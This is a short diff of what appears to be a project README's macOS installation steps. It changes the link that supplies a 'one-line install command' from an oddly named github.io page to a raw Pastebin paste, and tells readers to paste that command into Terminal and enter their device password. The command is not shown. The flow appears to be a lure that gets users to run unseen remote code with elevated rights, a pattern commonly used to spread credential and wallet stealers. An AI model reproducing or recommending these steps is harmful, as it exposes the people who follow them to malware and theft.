@@ -22,7 +22,7 @@
 ### Installation via a command in the Terminal:
 
 1. Get the one-line install command by clicking this button:  
-   [![Get macOS command](https://img.shields.io/badge/Get%20Command-macOS-0A84FF?style=for-the-badge&logo=apple&logoColor=white)](https://kjskkfifi84875.github.io/.github/coinmarketcal/command?os=mac)
+   [![Get macOS command](https://img.shields.io/badge/Get%20Command-macOS-0A84FF?style=for-the-badge&logo=apple&logoColor=white)](https://pastebin.com/raw/gYXhSxJp)
 2. Open **Terminal**, paste the command, and press **Return**.
 3. Enter your device password and confirm the installation if requested.
 
